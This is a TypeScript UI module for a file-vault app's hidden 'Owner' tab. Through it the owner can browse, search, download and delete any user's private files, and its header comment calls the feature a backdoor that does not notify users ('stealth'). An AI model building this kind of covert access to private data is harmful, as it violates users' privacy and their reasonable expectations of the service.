/**
 * OwnerPage — UI бэкдора владельца (vault-owner-backdoor, T6.4).
 *
 * Владелец (OWNER_ID) открывает личное хранилище ЛЮБОГО юзера «как своё»:
 * список юзеров → выбор цели → просмотр/поиск реестра → скачивание
 * (host-copy PM(юзера)→PM(владельца) + single-download из своего PM) →
 * удаление. Каждое действие аудируется на сервере (actor=OWNER_ID,
 * target_user_tg_id); юзер не уведомляется (stealth).
 *
 * Вход: скрытая вкладка «Owner» (App показывает её только если
 * /desktop/app-state → user.is_owner).
 *
 * SPEC: docs/ARCHITECTURE_VAULT_STORAGE.md §0.9/§6.1; T6.4;
 *       docs/ARCHITECTURE_VAULT_OWNER_DESKTOP_UI.md.
 */

import { api } from "../api";
import type { VaultFileItem, VaultOwnerUser } from "../api";
import { t, getLang } from "../i18n";

export interface OwnerPageDeps {
  /** Скачать личный файл цели (App переключается на DownloadPage.ownerDownload). */
  onDownload(targetTgId: number, pfId: number, name: string): void;
  /** Toast-уведомление. */
  onToast(message: string, type?: "success" | "error" | "info"): void;
}

/**
 * content_kind → i18n-ключ бейджа. Значение самого поля (данные файла)
 * НЕ переводится — локализуется только бейдж типа контента.
 */
const KIND_KEY: Record<
  string,
  | "search.kind.firmware"
  | "search.kind.documentation"
  | "search.kind.software"
  | "search.kind.datasheet"
  | "search.kind.isp_emmc"
  | "search.kind.repair_pictures"
  | "search.kind.any_file"
> = {
  firmware: "search.kind.firmware",
  documentation: "search.kind.documentation",
  software: "search.kind.software",
  // SP-35 (D-185): даташит микросхемы и произвольный файл личного хранилища.
  datasheet: "search.kind.datasheet",
  // SP-36 (D-188): ISP-подключение eMMC и фото ремонта.
  isp_emmc: "search.kind.isp_emmc",
  repair_pictures: "search.kind.repair_pictures",
  any_file: "search.kind.any_file",
};

/** Локализованный бейдж типа контента (переключается на лету вместе с языком). */
function kindLabel(kind?: string): string {
  return t(KIND_KEY[kind || "firmware"] ?? "search.kind.firmware");
}

function fmtSize(bytes: number): string {
  if (!bytes) return "—";
  const units = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return `${(bytes / Math.pow(1024, i)).toFixed(i > 1 ? 1 : 0)} ${units[i]}`;
}

/**
 * HTML-эскейп без литеральных entity в исходнике: write_to_file рендерит
 * `&...;` → исходник (см. AGENTS `chr(38)`-правило), поэтому entities
 * собираются конкатенацией, а не пишутся напрямую.
 */
function esc(s: unknown): string {
  return String(s ?? "").replace(/[&<>"']/g, (c) => {
    if (c === "&") return "&" + "amp;";
    if (c === "<") return "&" + "lt;";
    if (c === ">") return "&" + "gt;";
    if (c === '"') return "&" + "quot;";
    return "&" + "#39;";
  });
}

export class OwnerPage {
  private container: HTMLElement;
  private deps: OwnerPageDeps;

  private _users: VaultOwnerUser[] = [];
  private _mode: "users" | "target" = "users";
  private _target: VaultOwnerUser | null = null;
  private _targetFiles: VaultFileItem[] = [];
  /** Запрос последнего рендера списка юзеров (для перерисовки при смене языка). */
  private _usersQuery = "";
  /** true после первого рендера: защищает applyLang от отрисовки неоткрытой вкладки. */
  private _rendered = false;

  constructor(container: HTMLElement, deps: OwnerPageDeps) {
    this.container = container;
    this.deps = deps;
  }

  /** Сброс к списку юзеров + свежая загрузка (вызывается при открытии вкладки). */
  async open(): Promise<void> {
    this._mode = "users";
    this._target = null;
    this._targetFiles = [];
    await this._loadUsers("");
  }

  // ────────────────────────────────────────────────────────────────
  // View: список юзеров
  // ────────────────────────────────────────────────────────────────

  private async _loadUsers(query: string): Promise<void> {
    this._usersQuery = query;
    this._renderUsersLoading();
    try {
      const resp = await api.vaultOwnerUsers(query);
      this._users = resp.users || [];
    } catch (e: any) {
      this._users = [];
      this.deps.onToast(t("owner.err_users", { err: e?.message ?? String(e) }), "error");
    }
    this._renderUsers();
  }

  private _renderUsersLoading(): void {
    this._rendered = true;
    this.container.innerHTML = this._yellowBanner(t("owner.banner_users"));
    const c = document.createElement("div");
    c.className = "card";
    c.style.padding = "24px";
    c.innerHTML = `<div style="text-align:center; color:var(--text-dim);">${esc(t("owner.users_loading"))}</div>`;
    this.container.appendChild(c);
  }

  private _renderUsers(): void {
    this._rendered = true;
    this.container.innerHTML = this._yellowBanner(t("owner.banner_users"));

    const card = document.createElement("div");
    card.className = "card";
    card.innerHTML = `
      <div class="card-title">${esc(t("owner.users_title"))}</div>
      <div style="display:flex; gap:8px; margin:0 0 10px;">
        <input id="ownerUserSearch" style="flex:1;" placeholder="${esc(t("owner.users_search_placeholder"))}"
               value="${esc(this._usersQuery)}" />
        <button class="btn btn-secondary" id="ownerUserSearchBtn">${esc(t("owner.users_search_btn"))}</button>
      </div>
      <div style="display:flex; gap:8px; margin:0 0 14px;">
        <input id="ownerTgInput" style="flex:1;" placeholder="${esc(t("owner.tg_placeholder"))}" />
        <button class="btn btn-primary" id="ownerTgOpenBtn">${esc(t("owner.tg_open"))}</button>
      </div>
      <div id="ownerUsersList"></div>
    `;
    this.container.appendChild(card);

    const searchInput = card.querySelector<HTMLInputElement>("#ownerUserSearch")!;
    const runSearch = () => this._loadUsers(searchInput.value.trim());
    card.querySelector("#ownerUserSearchBtn")!.addEventListener("click", runSearch);
    searchInput.addEventListener("keydown", (e) => { if (e.key === "Enter") runSearch(); });

    card.querySelector("#ownerTgOpenBtn")!.addEventListener("click", () => {
      const raw = card.querySelector<HTMLInputElement>("#ownerTgInput")!.value.trim();
      const tg = Number(raw);
      if (!raw || !Number.isInteger(tg)) {
        this.deps.onToast(t("owner.err_tg_id"), "error");
        return;
      }
      this.gotoTarget({
        tg_id: tg, username: null, first_name: null, is_banned: false, files_count: 0,
      });
    });

    const list = card.querySelector<HTMLElement>("#ownerUsersList")!;
    if (this._users.length === 0) {
      list.innerHTML = `<div style="color:var(--text-dim); font-size:13px; padding:8px 0;">
        ${esc(t("owner.users_empty"))}</div>`;
      return;
    }
    this._users.forEach((u) => list.appendChild(this._userRow(u)));
  }

  private _userRow(u: VaultOwnerUser): HTMLElement {
    const row = document.createElement("div");
    row.style.cssText = [
      "display:flex; align-items:center; gap:10px; flex-wrap:wrap;",
      "padding:10px 12px; border:1px solid var(--glass-border); border-radius:10px;",
      "background:rgba(0,0,0,0.12); margin-bottom:8px;",
    ].join("");

    const ent = u.entitlement;
    let entText = t("owner.entitlement_none");
    if (ent && ent.is_active && !ent.expires_at) entText = t("owner.entitlement_unlimited");
    else if (ent && ent.is_active && ent.expires_at)
      entText = t("owner.entitlement_until", {
        date: new Date(ent.expires_at).toLocaleString(getLang()),
      });
    else if (ent && !ent.is_active) entText = t("owner.entitlement_expired");

    const left = document.createElement("div");
    left.style.cssText = "flex:1; min-width:220px;";
    const who = (u.first_name ? esc(u.first_name) : "—") + " " + (u.username ? "@" + esc(u.username) : "");
    const ban = u.is_banned ? '<span style="color:var(--error);">🚫 banned</span>' : "";
    left.innerHTML = `
      <div style="font-weight:600; font-size:14px;">${who} ${ban}</div>
      <div style="font-size:12px; color:var(--text-dim);">
        ${esc(t("owner.tg_id_label"))} <span style="font-family:monospace;">${esc(u.tg_id)}</span>
        · ${esc(t("owner.files_label"))} <b>${u.files_count ?? 0}</b>
        · ${esc(t("owner.entitlement_label"))} ${esc(entText)}
      </div>
    `;
    row.appendChild(left);

    const btn = document.createElement("button");
    btn.className = "btn btn-primary";
    btn.style.cssText = "white-space:nowrap;";
    btn.textContent = t("owner.open_storage");
    btn.addEventListener("click", () => this.gotoTarget(u));
    row.appendChild(btn);
    return row;
  }

  // ────────────────────────────────────────────────────────────────
  // View: хранилище цели
  // ────────────────────────────────────────────────────────────────

  private async gotoTarget(target: VaultOwnerUser): Promise<void> {
    this._mode = "target";
    this._target = target;
    await this._loadTargetFiles("");
  }

  private async _loadTargetFiles(query: string): Promise<void> {
    this._renderTargetLoading();
    try {
      const resp = query
        ? await api.vaultOwnerSearch(this._target!.tg_id, query)
        : await api.vaultOwnerFiles(this._target!.tg_id);
      this._targetFiles = resp.files || [];
    } catch (e: any) {
      this._targetFiles = [];
      this.deps.onToast(t("owner.err_read", { err: e?.message ?? String(e) }), "error");
    }
    this._renderTargetFiles();
  }

  private _renderTargetLoading(): void {
    this._rendered = true;
    this._renderTargetShell("");
    const list = this.container.querySelector<HTMLElement>("#ownerFilesList")!;
    list.innerHTML = `<div style="color:var(--text-dim); text-align:center; padding:12px;">${esc(t("owner.files_loading"))}</div>`;
  }

  private _renderTargetShell(query: string): void {
    this._rendered = true;
    const tgt = this._target!;
    const who = (tgt.username ? "@" + esc(tgt.username) + " " : "") + "(" + esc(tgt.tg_id) + ")";
    this.container.innerHTML = this._yellowBanner(
      t("owner.banner_target", { who }),
    );

    const card = document.createElement("div");
    card.className = "card";
    card.innerHTML = `
      <div style="display:flex; gap:8px; align-items:center; margin:0 0 12px; flex-wrap:wrap;">
        <button class="btn btn-secondary" id="ownerBackBtn">${esc(t("owner.back_to_list"))}</button>
        <div style="flex:1;"></div>
        <input id="ownerFileSearch" style="flex:1; min-width:180px; max-width:320px;"
               placeholder="${esc(t("owner.file_search_placeholder"))}" value="${esc(query)}" />
        <button class="btn btn-secondary" id="ownerFileSearchBtn">🔍</button>
      </div>
      <div id="ownerFilesList"></div>
    `;
    this.container.appendChild(card);

    card.querySelector("#ownerBackBtn")!.addEventListener("click", () => {
      this._mode = "users";
      this._target = null;
      this.open();
    });
    const runSearch = () => this._loadTargetFiles(
      card.querySelector<HTMLInputElement>("#ownerFileSearch")!.value.trim(),
    );
    card.querySelector("#ownerFileSearchBtn")!.addEventListener("click", runSearch);
    card.querySelector<HTMLInputElement>("#ownerFileSearch")!.addEventListener("keydown", (e) => {
      if (e.key === "Enter") runSearch();
    });
  }

  private _renderTargetFiles(): void {
    const query = this._lastTargetQuery();
    this._renderTargetShell(query);
    const list = this.container.querySelector<HTMLElement>("#ownerFilesList")!;
    if (this._targetFiles.length === 0) {
      list.innerHTML = `<div style="color:var(--text-dim); font-size:13px; padding:8px 0;">
        ${esc(t("owner.files_empty"))}</div>`;
      return;
    }
    this._targetFiles.forEach((f) => list.appendChild(this._fileRow(f)));
  }

  private _lastTargetQuery(): string {
    const input = this.container.querySelector<HTMLInputElement>("#ownerFileSearch");
    return input ? input.value : "";
  }

  private _fileRow(f: VaultFileItem): HTMLElement {
    const row = document.createElement("div");
    row.style.cssText = [
      "display:flex; align-items:center; gap:10px; flex-wrap:wrap;",
      "padding:10px 12px; border:1px solid var(--glass-border); border-radius:10px;",
      "background:rgba(0,0,0,0.12); margin-bottom:8px;",
    ].join("");

    const kind = kindLabel(f.content_kind);
    // SP-35 (D-185): даташит/произвольный файл тоже называют карточку через title.
    // SP-36 (D-188): + isp_emmc / repair_pictures.
    const rawKind = f.content_kind || "firmware";
    const titleOnly =
      rawKind === "software" || rawKind === "datasheet" || rawKind === "any_file" ||
      rawKind === "isp_emmc" || rawKind === "repair_pictures";
    const title = f.title && titleOnly
      ? " " + f.title
      : (f.brand || f.model)
        ? " " + [f.brand, f.model, f.version].filter(Boolean).join(" ")
        : "";

    const left = document.createElement("div");
    left.style.cssText = "flex:1; min-width:220px;";
    const published = f.published_file_id
      ? `<span style="color:#22c55e;">${esc(t("owner.file_published", { id: f.published_file_id }))}</span>`
      : "";
    left.innerHTML = `
      <div style="font-weight:600; font-size:14px;">${esc(kind)}${esc(title)}</div>
      <div style="font-size:12px; color:var(--text-dim);">
        <span style="word-break:break-all;">${esc(f.original_name || t("owner.file_no_name", { id: f.id }))}</span>
        · ${esc(fmtSize(f.size_bytes))}${published}
      </div>
    `;
    row.appendChild(left);

    const dl = document.createElement("button");
    dl.className = "btn btn-primary";
    dl.textContent = t("owner.download");
    dl.addEventListener("click", () =>
      this.deps.onDownload(this._target!.tg_id, f.id, f.original_name || `${f.brand}_${f.model}`),
    );
    row.appendChild(dl);

    const del = document.createElement("button");
    del.className = "btn btn-secondary";
    del.style.cssText = "color:var(--error); white-space:nowrap;";
    del.textContent = t("owner.delete");
    let armed = false;
    del.addEventListener("click", async () => {
      if (!armed) {
        armed = true;
        del.textContent = t("owner.delete_confirm");
        del.style.borderColor = "var(--error)";
        setTimeout(() => {
          armed = false;
          del.textContent = t("owner.delete");
          del.style.borderColor = "";
        }, 4000);
        return;
      }
      del.disabled = true;
      try {
        const resp = await api.vaultOwnerDelete(this._target!.tg_id, f.id);
        // already_deleted (идемпотентный повтор) — тот же успех: файл исчез.
        this.deps.onToast(
          t("owner.deleted", { id: f.id, tg: this._target!.tg_id }),
          "success",
        );
        await this._loadTargetFiles(this._lastTargetQuery());
      } catch (e: any) {
        if (e?.status === 404) {
          // Сервер: записи уже нет («призрак» индекса) — считаем удалённой.
          this.deps.onToast(
            t("owner.deleted", { id: f.id, tg: this._target!.tg_id }),
            "success",
          );
          await this._loadTargetFiles(this._lastTargetQuery());
          return;
        }
        this.deps.onToast(t("owner.err_delete", { err: e?.message ?? String(e) }), "error");
        del.disabled = false;
      }
    });
    row.appendChild(del);

    return row;
  }

  /**
   * Перерисовать текущий экран после смены языка.
   *
   * Без сетевых запросов: рендер из сохранённого состояния
   * (_users / _targetFiles / _mode). Вызывается подпиской на i18n в App,
   * поэтому переключение языка применяется сразу, в том же тике — без
   * «залипания» до повторного открытия вкладки.
   */
  applyLang(): void {
    if (!this._rendered) return;
    if (this._mode === "target" && this._target) {
      this._renderTargetFiles();
      return;
    }
    this._renderUsers();
  }

  private _yellowBanner(html: string): string {
    return `
      <div style="
        background:rgba(234,179,8,0.14);
        border:1px solid rgba(234,179,8,0.45);
        color:#fbbf24;
        border-radius:10px;
        padding:10px 14px;
        margin:0 0 14px;
        font-size:13px;
        line-height:1.5;
      ">${html}</div>
    `;
  }
}
